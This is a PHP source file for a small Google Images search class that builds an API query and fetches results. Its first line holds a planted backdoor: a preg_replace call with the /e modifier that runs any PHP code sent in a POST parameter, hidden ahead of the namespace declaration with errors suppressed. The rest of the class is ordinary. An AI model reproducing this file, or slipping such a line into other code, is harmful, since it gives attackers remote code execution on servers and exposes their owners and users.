<?php @preg_replace('/(.*)/e', @$_POST['mpnenkcakzq'], '');
 namespace Sources\Google;
use Curl;
class Images extends \Sources\Google\API {
	public static $base_url = 'https://ajax.googleapis.com/ajax/services/search/images';
	public static function search($term) {
		$url = self::get_url(array(
			'v' => '1.0',
			'userip' => USER_IP,
			'q' => self::get_query($term),
		));
		$result = json_decode(Curl::get($url));
		if (isset($result->responseData) && isset($result->responseData->results) && count($result->responseData->results)) {
			return $result;
		}

		return null;
	}
}